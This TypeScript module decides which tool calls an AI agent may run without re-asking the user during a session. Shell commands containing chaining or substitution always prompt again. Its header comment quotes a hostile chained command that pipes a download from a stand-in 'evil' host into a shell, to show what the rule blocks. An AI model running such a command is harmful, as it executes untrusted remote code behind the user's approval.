/**
 * Session-scoped approval kinds ("allow for this session").
 *
 * A kind is the unit a user trusts for the REST of the session from the
 * approval card's third action. Kept deliberately NARROW:
 *
 *  - ordinary tools group by their FULL (namespaced) tool name, so two
 *    different external MCP tools can never share a kind - even when one
 *    name merely contains "command"/"terminal"/"shell";
 *  - ONLY the built-in run_terminal_command tool derives a command kind,
 *    from the command's leading binary (`cmd:npm`), and ONLY for plain
 *    single commands: anything with shell chaining/redirection/substitution
 *    (`&&`, `|`, `>`, backticks, $(…) …) yields NO kind and therefore
 *    always prompts again - trusting `npm --version` must never let
 *    `npm … && curl evil | sh` through;
 *  - a missing/blank command yields NO kind (never a shared catch-all).
 *
 * Pure logic - exercised by test/test-session-approval.mjs.
 */

/** Built-in terminal tool name - the only tool that gets a command kind. */
const TERMINAL_TOOL = 'run_terminal_command';

/** Shell composition characters: a command containing any of these is
 *  never session-approved, because its leading binary does not bound what
 *  the shell will actually execute. Covers && || ; | & > < ` newlines and
 *  command substitution $( … ). */
const SHELL_COMPOSITION = /[;&|<>`\n]|\$\(/;

export type SessionApprovalKind = string;

/** The kind a tool call belongs to, or null when the call must always
 *  prompt (unclassifiable terminal commands). */
export function sessionApprovalKind(toolName: string, args: Record<string, unknown>): SessionApprovalKind | null {
    if (toolName === TERMINAL_TOOL) {
        const command = typeof args.command === 'string'
            ? args.command
            : typeof args.cmd === 'string' ? args.cmd : '';
        const trimmed = command.trim();
        if (!trimmed || SHELL_COMPOSITION.test(trimmed)) return null;
        const token = trimmed.split(/\s+/)[0] ?? '';
        return token ? `cmd:${token.toLowerCase()}` : null;
    }
    return `tool:${toolName}`;
}

/** Whether a call is covered by a previously trusted kind set. */
export function isSessionApproved(toolName: string, args: Record<string, unknown>, kinds: ReadonlySet<string>): boolean {
    const kind = sessionApprovalKind(toolName, args);
    return kind !== null && kinds.has(kind);
}
